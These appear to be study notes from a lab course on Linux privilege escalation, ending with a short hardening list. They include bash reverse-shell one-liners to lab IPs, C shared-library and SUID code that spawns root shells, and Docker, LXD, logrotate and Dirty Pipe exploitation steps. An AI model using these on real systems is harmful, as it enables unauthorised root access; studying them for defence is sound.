
    
                //Enumeration


      -Some cool stuff to enumerate for



    Services and applications  installed?

    Services running

    Sockets in use?

    Users, admins, and groups on the system?

    Who is current logged in? What users recently logged in?

    Password policies

    Is the host joined to an Active Directory domain?

    History, log, and backup files

    Which files have been modified recently 

    IP addressing information

    /etc/hosts file?

    Interesting network connections to other systems 

    Tools installed on the system 

    bash_history file for any users 

    Cron jobs 




        


        --OS Version

      $ cat /etc/os-release


   

        --Kernel Version

      $ uname -a

      $ cat /proc/version


      $ lscpu         (CPU type/version)


        --Running Services


      $ cat /etc/shells      (   What login shells exist on the server?    )


      $ lpstat                (  checks any installed and running printers  )

    -List Current Processes

    $ ps aux | grep root




    ////Enviroment

    In a domain environment we'll definitely want to check /etc/resolv.conf if the host is configured to use internal DNS we may be able to use this as a starting point to query the Active Directory environment.


    $cat  /etc/resolv.conf


    $ arp -a



    --Mounted file systems


    $ df -h


    ---Unmounted File Systems

    When a file system is unmounted, it is no longer accessible by the system

    $ cat /etc/fstab | grep -v "#" | column -t

    --All Hidden Directories

    $ find / -type d -name ".*" -ls 2>/dev/null

    The data retention time for /var/tmp is much longer than that of the /tmp directory. By default, all files and data stored in /var/tmp are retained for up to 30 days. In /tmp, on the other hand, the data is automatically deleted after ten days.

    In addition, all temporary files stored in the /tmp directory are deleted immediately when the system is restarted.






        --Installed Packages and Versions

        --Logged in Users

        $ w

        $ lastlog

        --User Home Directories:

        User home folders may also contain SSH keys that can be used to access other systems or 
        scripts and configuration files containing credentials. (id_rsa)

        //Bash History

        $ history

        $ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null


        --Sudo Privileges

        --Configuration Files: all files that end in extensions such as .conf and .config

        --Readable Shadow File

        --Password Hashes in /etc/passwd

        --Cron Jobs :  

        $ ls -la /etc/cron.daily/


        --Unmounted File Systems and Additional Drives

        $ lsblk

        --SETUID and SETGID Permissions


        --Writeable Directories

        $ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null


        ---user groups

        $ cat /etc/group


        We can then use the getent command to list members of any interesting groups.


       $ getent group sudo


                    ///Kernel exploits

        
      The proc filesystem (proc / procfs) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is the primary way to access process information and can be used to view and modify kernel settings. It is virtual and does not exist as a real filesystem but is dynamically generated by the kernel. It can be used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.

      $ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"




        $ uname -a

        or

        $ cat /etc/lsb-release 


        $ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit



                    ///Vulnerable Services

        
        --Installed Packages

        $ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list


        --strace

        We can use the diagnostic tool strace on Linux-based operating systems to track and analyze system calls and signal processing. It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system. In addition, we can also use the tool to monitor security-related activities and identify potential attack vectors, such as specific requests to remote hosts using passwords or tokens.

        The output of strace can be written to a file for later analysis, and it provides a wealth of options that allow detailed monitoring of the program's behavior.


        $ strace ping -c1 10.129.112.20



        --Screen Version Identification

        $ screen -v

        $ ./screen_exploit.sh 


        ---Sudo Version

        $ sudo -V



        --Binaries

        $ ls -l /bin /usr/bin/ /usr/sbin/


              //Network

        $ ip a

        $ cat /etc/hosts  (  hosts accesed recently   )



                    ////Cron Job Abuse

        
        The crontab command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in /var/spool/cron for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry 0 */12 * * * /home/admin/backup.sh would run every 12 hours.

        The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a .tar.gz file every 12 hours). In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.



         $ ls -la /etc/cron.daily/



        First, let's look around the system for any writeable files or directories.

        $ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

        We can confirm that a cron job is running using pspy,

        $ ./pspy64 -pf -i 1000

        The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan profcs every 1000ms (or every second).

         Let's modify the script to add a Bash one-liner reverse shell.

         bash -i >& /dev/tcp/10.10.15.12/443 0>&1



                    ///Setuid Bit


        
        $ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null




                    ///Setguid

        $ find / -uid 0 -perm -6000 -type f 2>/dev/null



                    ///Sudo Rights Abuse


        $ sudo -l



                    ///Path Abuse


        PATH is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary.

        $ echo $PATH



                    ///Wildcard Abuse


        A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:
        Character 	                Significance
        * 	        An asterisk that can match any number of characters in a file name.
        ? 	        Matches a single character.
        [ ] 	    Brackets enclose characters and can match any single one at the defined position.
        
        ~ 	        A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.
        
        - 	        A hyphen within brackets will denote a range of characters.




                    ///Searching for Creds


        When enumerating a system, it is important to note down any credentials. These may be found in configuration files (.conf, .config, .xml, etc.), shell scripts, a user's bash history file, backup (.bak) files, within database files or even in text files. 

         $ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

        $ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"


        The /var directory typically contains the web root for whatever web server is running on the host.

        $ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'

        The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).

        $  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

        $  ls ~/.ssh




                    //Shared Libraries


        It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: static libraries (denoted by the .a file extension) and dynamically linked shared object libraries (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.


        There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the -rpath or -rpath-link flags when compiling a program, using the environmental variables LD_RUN_PATH or LD_LIBRARY_PATH, placing libraries in the /lib or /usr/lib default directories, or specifying another directory containing the libraries within the /etc/ld.so.conf configuration file.


        Additionally, the LD_PRELOAD environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the ldd utility.


        $ ldd /bin/ls


        //LD_PRELOAD Privilege Escalation


        Let's see an example of how we can utilize the LD_PRELOAD environment variable to escalate privileges. For this, we need a user with sudo privileges.


        $ sudo -l

          (root) NOPASSWD: /usr/sbin/apache2 restart


        This user has rights to restart the Apache service as root, but since this is NOT a GTFOBin and the /etc/sudoers entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the LD_PRELOAD issue to run a custom shared library file. Let's compile the following library:

        (root.c)

        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
        }



        $ gcc -fPIC -shared -o root.so root.c -nostartfiles



        $ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

        Make sure to specify the full path to your malicious library file.



                  ////Capabilities

        --Set Capability

        In Ubuntu, we can use the setcap command to set capabilities for specific executables. This command allows us to specify the capability we want to set and the value we want to assign.

        we could use the following command to set the cap_net_bind_service capability for an executable:

        $ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic


        If the cap_net_bind_service capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted.


        Some capabilities, such as cap_sys_admin, which allows an executable to perform actions with administrative privileges, can be dangerous if they are not used properly. For example, we could exploit them to escalate their privileges, gain access to sensitive information, or perform unauthorized actions. Therefore, it is crucial to set these types of capabilities for properly sandboxed and isolated executables and avoid granting them unnecessarily.


        Capability 	                        Desciption


        -cap_sys_admin 	          
        
        Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.

        -cap_sys_chroot 	          
        
        Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.

        -cap_sys_ptrace 	          
        
        Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.

        -cap_sys_nice 	            
        
        Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.

        -cap_sys_time 	            
        
        Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.

        -cap_sys_resource 	        
        
        Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.

        -cap_sys_module 	          
        
        Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.

        -cap_net_bind_service 	    
        
        Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.


        //Enumerating Capabilities

        $ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;


        --Exploitation of  the cap_sys_admin

        






                    ///Shared Object Hijacking



        Programs and binaries under development usually have custom libraries associated with them. Consider the following SETUID binary.

        $ ls -la payroll

        -rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll


        We can use ldd to print the shared object required by a binary or shared object. Ldd displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.


        $ ldd payroll

        We see a non-standard library named libshared.so listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the RUNPATH configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.

        $ readelf -d payroll  | grep PATH


         0x000000000000001d (RUNPATH)            Library runpath: [/development]


         The configuration allows the loading of libraries from the /development folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in /development, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).\


         $ ls -la /development/

        total 8
        drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
        drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../

        Before compiling a library, we need to find the function name called by the binary.

        $ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so


        $ ldd payroll

        linux-vdso.so.1 (0x00007ffd22bbc000)
        libshared.so => /development/libshared.so (0x00007f0c13112000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)


        $ ./payroll 

        ./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery


        We can copy an existing library to the development folder. Running ldd against the binary lists the library's path as /development/libshared.so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named dbquery. We can compile a shared object which includes this function.



        #include<stdio.h>
        #include<stdlib.h>

        void dbquery() {
            printf("Malicious library loaded\n");
            setuid(0);
            system("/bin/sh -p");
        } 



        The dbquery function sets our user id to 0 (root) and executing /bin/sh when called. Compile it using GCC.


        $ gcc src.c -fPIC -shared -o /development/libshared.so




                  ///Privileged Groups


        /LXC / LXD



        LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root. Let's confirm group membership and use these rights to escalate to root.


        $ id

        uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)

        Unzip the Alpine image.

        $ unzip alpine.zip 

        Start the LXD initialization process. Choose the defaults for each prompt. Consult this post for more information on each step.(https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04)

        $ lxd init

        Import the local image.

        $ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine


        Start a privileged container with the security.privileged set to true to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

        $ lxc init alpine r00t -c security.privileged=true

        Mount the host file system.

        $ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

        Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type cd /mnt/root/root. From here we can read sensitive files such as /etc/shadow and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.


        $ lxc start r00t
        $ lxc exec r00t /bin/sh



            //Docker

        Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command docker run -v /root:/mnt -it ubuntu. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as /etc which could be used to retrieve the contents of the /etc/shadow file for offline password cracking or adding a privileged user.


            //Disk

        Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.


            //ADM

        Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.



                    ///Passive Traffic Capture
        


        If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as net-creds and PCredz that can be used to examine data being passed on the wire.



                    //Weak NFS Privileges

        $ showmount -e 10.129.2.12

        When an NFS volume is created, various options can be set:

        Option 	Description
  root_squash 	If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set.
  
  no_root_squash 	Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.


  For example, we can create a SETUID binary that executes /bin/sh using our local root user. We can then mount the /tmp directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.


        $ cat shell.c 



        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        int main(void)
        {
          setuid(0); setgid(0); system("/bin/bash");
        }


      $ gcc shell.c -o shell

      $ sudo mount -t nfs 10.129.2.12:/tmp /mnt
      $ cp shell /mnt
      $ chmod u+s /mnt/shell


      When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.




              ///Hijacking Tmux Sessions


      Terminal multiplexers such as tmux can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a tmux window, we can detach from the session, still leaving it active (i.e., running an nmap scan). For many reasons, a user may leave a tmux process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.



      $ tmux -S /shareds new -s debugsess

      $ chown root:devs /shareds


      Check for any running tmux processes.

      $  ps aux | grep tmux

      Confirm permissions.

      $ ls -la /shareds 

      srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds


      Finally, attach to the tmux session and confirm root privileges.

      $ tmux -S /shareds




              ////Escaping Restricted Shells


      -RBASH
       
      -RKSH  Restricted Korn shell (rksh)

      -RZSH



      --Command injection

      $ ls -l `pwd` 


      --Command Substitution

      This involves using the shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.


      --Command Chaining

      In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.


      --Environment Variables

      For escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.

      --Shell Functions

      In some cases, it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.


      $ while read line; do echo $line; done < /etc/passwd; echo $line


      (   https://exploit-notes.hdks.org/exploit/network/protocol/restricted-shell-bypass/  )





                    /////Linux Containers
      



      Linux Containers (LXC) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security.

      Linux Daemon (LXD) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the lxc or lxd group. We can find this out with the following command:

      $ id

      From here on, there are now several ways in which we can exploit LXC/LXD. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.

      The focus on security would complicate the whole initiation, make it more difficult and thus slow it down considerably. If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to import this container as an image.

      $ lxc image import ubuntu-template.tar.xz --alias ubuntutemp

      $ lxc image list

      After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the security.privileged flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

      $ lxc init ubuntutemp privesc -c security.privileged=true

      $ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

      Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the resource of the host system as root.

      $ lxc start privesc

      $ lxc exec privesc /bin/bash

      root@nix02:~# ls -l /mnt/root



      ///Docker




      Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. Docker uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources. One advantage is that containerization thus consumes significantly fewer resources than a traditional server or virtual machine. The core feature of Docker is that applications are encapsulated in so-called Docker containers. They can thus be used for any operating system. A Docker container represents a lightweight standalone executable software package that contains everything needed to run an application code runtime.

      Docker also provides a toolkit commonly used to package applications into immutable container images. This is done by writing a Dockerfile and running the appropriate commands to create the image using the Docker server.      
      
      -Docker Privilege Escalation
      

      -Docker Shared Directories
      When using Docker, shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem. 
      With shared directories, specific directories or files on the host system can be made accessible within the container.

      It's important to note that shared directories can be mounted as read-only or read-write, depending on specific administrator requirements.When mounted as read-only, modifications made within the container won't affect the host system.




      To gain root privileges through Docker, the user we are logged in with must be in the docker group. This allows him to use and control the Docker daemon.


      Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run docker as root.

      To see which images exist and which we can access, we can use the following command:

      $ docker image ls

      $ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

      root@nix02:~# ls -l /mnt

      
      
      //Docker Socket

      A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of our Docker setup.

      When we issue a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn, processes the command and carries out the requested actions.
      
      By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources. This remote API access expands the possibilities for distributed Docker setups and remote management scenarios.
      
      htb-student@container:~/app$ ls -al
      srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock

      $ wget https://<parrot-os>:443/docker -O docker
      $ chmod +x docker
      $ ls -l
      -rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker

      $ /tmp/docker -H unix:///app/docker.sock ps

      We can create our own Docker container that maps the hostâ€™s root directory (/) to the /hostsystem directory on the container. 

      we must map these directories accordingly and use the main_app Docker image.

      htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

      htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

      Now, we can log in to the new privileged Docker container and navigate to the /hostsystem.

      htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash



      A case that can also occur is when the Docker socket is writable. Usually this socket is located in /var/run/docker.sock


      :~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

      root@nix02:~# ls -l /mnt



      -Docker Group

      To gain root privileges through Docker, the user we are logged in with must be in the docker group. This allows him to use and control the Docker daemon.

      $ docker image ls

      $docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
      
      
      


                ///LOGROTATE


      Logrotate has many features for managing the /var/log log files. These include the specification of:

    the size of the log file,
    its age,
    and the action to be taken when one of these factors is reached.

      
      This tool is usually started periodically via cron and controlled via the configuration file /etc/logrotate.conf. Within this file, it contains global settings that determine the function of logrotate.

      To force a new rotation on the same day, we can set the date after the individual log files in the status file /var/lib/logrotate/status or use the -f/--force option:

      We can find the corresponding configuration files in /etc/logrotate.d/ directory.

      $ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}


      /exploit

      To exploit logrotate, we need some requirements that we have to fulfill.



      we need write permissions on the log files
      
      logrotate must run as a privileged user or root
      
      vulnerable versions:
          3.8.6
          3.11.0
          3.15.0
          3.18.0

      
      There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named logrotten. 


      $ git clone https://github.com/whotwagner/logrotten.git

      $ cd logrotten

      $ gcc logrotten.c -o logrotten


      Next, we need a payload to be executed. 


      $ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

      However, before running the exploit, we need to determine which option logrotate uses in logrotate.conf

      $ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

      
      $ ./logrotten -p ./payload /tmp/tmp.log







                ////Python Library Hijacking

      

      There are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:

    Wrong write permissions
    Library Path
    PYTHONPATH environment variabale



      we can imagine that we are in a developer's host on the company's intranet and that the developer is working with python. So we have a total of three components that are connected. This is the actual python script that imports a python module and the privileges of the script as well as the permissions of the module.

One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If SUID/SGID permissions have been assigned to the Python script that imports this module, our code will automatically be included.

If we look at the set permissions of the mem_stats.py script, we can see that it has a SUID set.

      
      
      ///PYTHONPATH Listing

      $ python3 -c 'import sys; print("\n".join(sys.path))'


      To be able to use this variant, two prerequisites are necessary.

      The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable.
    
      We must have write permissions to one of the paths having a higher priority on the list.


      Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions. Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.



      ///Python library Default Installation Location

      $pip3 show {library}





      ////PYTHONPATH Environment Variable

      PYTHONPATH is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a user-defined location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our sudo permissions:

      $ sudo -l 

         (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3


      As we can see from the example, we are allowed to run /usr/bin/python3 under the trusted permissions of sudo and are therefore allowed to set environment variables for use with this binary by the SETENV: flag being set. 

      $ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_stats.py






                    ///Polkit

      
      PolicyKit (polkit) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. To check whether the user software is authorized for this instruction, polkit is asked. It is possible to set how permissions are granted by default for each user and application. For example, for each user, it can be set whether the operation should be generally allowed or forbidden, or authorization as an administrator or as a separate user with a one-time, process-limited, session-limited, or unlimited validity should be required. For individual users and groups, the authorizations can be assigned individually.

      Polkit works with two groups of files.

      actions/policies (/usr/share/polkit-1/actions)
      rules (/usr/share/polkit-1/rules.d)


      Polkit also has local authority rules  :::/etc/polkit-1/localauthority/50-local.d/file..pkla


      PolKit also comes with three additional programs:

      pkexec - runs a program with the rights of another user or with root rights
      pkaction - can be used to display actions
      pkcheck - this can be used to check if a process is authorized for a specific action


      ///Pwnkit

      



                    ////Dirty Pipe


      A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux. All kernels from version 5.8 to 5.17 are affected and vulnerable to this vulnerability.

      this vulnerability allows a user to write to arbitrary files as long as he has read access to these files.This vulnerability is based on pipes.

      $ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git

      $ bash compile.sh

      $ ./exploit-1

      writes in /etc/passwd


      $ ./exploit-2 {suid_binary}

      














                ///Linux Hardening


      --Configuration Management

      This is by no means an exhaustive list, but some simple hardening measures are to:

    Audit writable files and directories and any binaries set with the SUID bit.
    Ensure that any cron jobs and sudo privileges specify any binaries using the absolute path.
    Do not store credentials in cleartext in world-readable files.
    Clean up home directories and bash history.
    Ensure that low-privileged users cannot modify any custom libraries called by programs.
    Remove any unnecessary packages and services that potentially increase the attack surface.
    Consider implementing SELinux, which provides additional access controls on the system.


    


